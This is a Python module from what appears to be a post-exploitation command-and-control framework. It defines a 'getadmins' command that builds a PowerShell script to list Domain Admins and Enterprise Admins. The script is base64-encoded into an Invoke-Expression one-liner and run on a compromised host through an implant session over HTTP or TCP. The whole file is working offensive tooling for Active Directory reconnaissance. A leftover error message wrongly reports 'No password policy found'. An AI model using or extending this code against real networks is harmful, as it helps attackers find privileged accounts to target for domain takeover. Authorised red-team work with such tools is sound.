import argparse
import base64
import os
import sys

from core.gunnershell.commands.base import register, Command, connection_builder
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen  = "\001" + Style.BRIGHT + Fore.GREEN  + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred    = "\001" + Style.BRIGHT + Fore.RED    + "\002"

@register("getadmins")
class GetAdminsCommand(Command):
	"""List members of Domain Admins and Enterprise Admins."""

	@property
	def help(self):
		return "getadmins [-d <domain>] [--dc-ip <ip>]"

	def execute(self, args):
		parser = argparse.ArgumentParser(prog="getadmins", add_help=False)
		parser.add_argument("-d","--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
		parser.add_argument("--dc-ip",      dest="dc_ip",  required=False, help="IP address of the Domain Controller")

		try:
			opts = parser.parse_args(args)

		except SystemExit:
			print(brightyellow + self.help)
			return

		out = self.logic(
			sid    = self.gs.sid,
			domain = opts.domain,
			dc_ip  = opts.dc_ip,
			op_id  = self.op_id
		)

		if out:
			print(brightgreen + out if "[!]" not in out else out)
		else:
			print(brightred + "[!] No output")

	def logic(self, sid, domain=None, dc_ip=None, op_id="console"):
		"""
		getadmins [-d <domain>] [--dc-ip <ip>]
		- No flags: list members of "Domain Admins" and "Enterprise Admins" in the current domain.
		- -d, --domain: target a specific AD domain.
		- --dc-ip:      target a specific DC by IP.
		"""
		sess = session_manager.sessions.get(sid)
		if not sess:
			return brightred + "[!] Invalid session"
		transport = sess.transport.lower()

		# build DC-resolution preamble exactly like your other commands
		target = dc_ip or domain or None
		if target:
			dns_preamble = connection_builder(dc_ip, domain)
			if dns_preamble == "ERROR":
				return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"
			server_arg = "-Server $nb"
			root       = "$ldapPath = \"LDAP://$nb\"; $root = ([ADSI] $ldapPath).defaultNamingContext"
			dom_admins = f"$domainAdmins = (Get-ADGroupMember -Identity \"Domain Admins\" {server_arg} | Select-Object -ExpandProperty SamAccountName)"
			enter_admins = f"$enterpriseAdmins = (Get-ADGroupMember -Identity \"Enterprise Admins\" {server_arg} | Select-Object -ExpandProperty SamAccountName)"

		else:
			dns_preamble = ""
			server_arg   = ""
			root         = "$root = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext"
			dom_admins = f"$domainAdmins = (Get-ADGroupMember -Identity \"Domain Admins\" | Select-Object -ExpandProperty SamAccountName)"
			enter_admins = f"$enterpriseAdmins = (Get-ADGroupMember -Identity \"Enterprise Admins\" | Select-Object -ExpandProperty SamAccountName)"

		# PowerShell snippet
		ps = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADGroupMember -ErrorAction SilentlyContinue) {{
	  {dom_admins}
	  {enter_admins}

	  if (($domainAdmins) -or ($enterpriseAdmins)) {{
		if ($domainAdmins) {{
		  Write-Output "====Domain Admins===="
		  Write-Output $domainAdmins
		  Write-Output "\n"
		}}

		if ($enterpriseAdmins) {{
		  Write-Output "====Enterprise Admins===="
		  Write-Output $enterpriseAdmins
		  Write-Output "\n"
		}}
	  }}

		if ((-not $domainAdmins) -and (-not $enterpriseAdmins)) {{ Write-Output "Nothing Found" }}

  }} else {{
	  {root}
	  # LDAP fallback: grab the 'member' DNs then resolve each to samAccountName
	  $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root","(CN=Domain Admins)")
	  $res = $searcher.FindOne()
	  $domainAdmins = @()
	  if ($res) {{ $domainAdmins = $res.Properties["member"] }}
	  $searcher.Filter = "(CN=Enterprise Admins)"
	  $res = $searcher.FindOne()
	  $enterpriseAdmins = @()
	  if ($res) {{ $enterpriseAdmins = $res.Properties["member"] }}

	  if ((-not $domainAdmins) -and (-not $enterpriseAdmins)) {{ Write-Output "Nothing Found" }}
	  else {{
		if ($domainAdmins) {{
		  Write-Output "====Domain Admins===="
		  foreach ($r in $domainAdmins) {{
			Write-Output $r.Properties["samaccountname"][0]
		  }}
		  Write-Output "\n"
		}}

		if ($enterpriseAdmins) {{
		  Write-Output "====Enterprise Admins===="
		  foreach ($r in $enterpriseAdmins) {{
			Write-Output $r.Properties["samaccountname"][0]
		  }}
		  Write-Output "\n"
		}}
	  }}
  }}
}} catch {{
	{root}
	# LDAP fallback: grab the 'member' DNs then resolve each to samAccountName
	$searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root","(CN=Domain Admins)")
	$res = $searcher.FindOne()
	$domainAdmins = @()
	if ($res) {{ $domainAdmins = $res.Properties["member"] }}
	$searcher.Filter = "(CN=Enterprise Admins)"
	$res = $searcher.FindOne()
	$enterpriseAdmins = @()
	if ($res) {{ $enterpriseAdmins = $res.Properties["member"] }}

	if ((-not $domainAdmins) -and (-not $enterpriseAdmins)) {{ Write-Output "Nothing Found" }}
	else {{
	  if ($domainAdmins) {{
		Write-Output "====Domain Admins===="
		foreach ($r in $domainAdmins) {{
		  Write-Output $r.Properties["samaccountname"][0]
		}}
		Write-Output "\n"
	  }}

	  if ($enterpriseAdmins) {{
		Write-Output "====Enterprise Admins===="
		foreach ($r in $enterpriseAdmins) {{
		  Write-Output $r.Properties["samaccountname"][0]
		}}
		Write-Output "\n"
	  }}
	}}
}}
"""


		# encode & dispatch
		b64 = base64.b64encode(ps.encode('utf-16le')).decode()
		one_liner = (
			"$ps=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"" + b64 + "\"));"
			"Invoke-Expression $ps"
		)

		if transport in ("http", "https"):
			out = http_exec.run_command_http(sid, one_liner, op_id=op_id)

		elif transport in ("tcp", "tls"):
			out = tcp_exec.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)

		else:
			return brightred + "[!] Unknown session transport!"

		if out:
			if "Failed to resolve DC!" in out:
				return brightred + "[!] Failed to resolve DC, use --dc‑ip or --domain with the correct IP/domain"
		
			elif "Nothing Found" in out:
				return brightred + "[!] No password policy found!"

			else:
				return out